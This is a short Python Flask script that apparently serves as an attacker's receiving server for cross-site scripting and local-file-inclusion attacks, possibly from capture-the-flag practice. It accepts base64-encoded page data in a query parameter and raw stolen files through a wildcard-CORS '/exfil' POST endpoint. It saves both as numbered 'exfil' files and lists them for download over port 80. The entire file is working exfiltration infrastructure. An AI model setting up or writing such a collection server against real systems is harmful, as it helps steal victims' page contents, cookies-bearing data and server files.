#!/usr/bin/python3
import os
from flask import Flask, request, render_template_string, send_from_directory
import base64
from pathlib import Path

app = Flask(__name__)
counter = 1
directory = os.getcwd()

@app.route('/')
def index():
    global counter
    xss_data = request.args.get('xss')
    
    if xss_data:
        try:
            decoded_data = base64.b64decode(xss_data.replace(' ', '+'))
            file_name = f'exfil_{counter}.html'
            with open(file_name, 'wb') as f:
                f.write(decoded_data)
            
            counter += 1
            return f"Data written to {file_name}"
        
        except Exception as e:
            return f"Error: {str(e)}", 400
    
    else:
        files = os.listdir(directory)
        links = [f'<a href="/files/{file}">{file}</a>' for file in files if os.path.isfile(os.path.join(directory, file))]
        html_content = "<h1>Files in the current directory:</h1><ul>" + "".join([f"<li>{link}</li>" for link in links]) + "</ul>"
        return render_template_string(html_content)

@app.route('/files/<filename>')
def serve_file(filename):
    try:
        return send_from_directory(directory, filename)
    except Exception as e:
        return f"Error: {str(e)}", 404

# LFI part ---
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
    return response

@app.route('/exfil', methods=["POST", "OPTIONS"])
def exfil():
    global counter
    if request.method == 'OPTIONS':
        return '', 200
    data = request.get_data()
    Path(f'exfil_{counter}.zip').write_bytes(data)
    counter += 1
    return '', 200
# ---

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
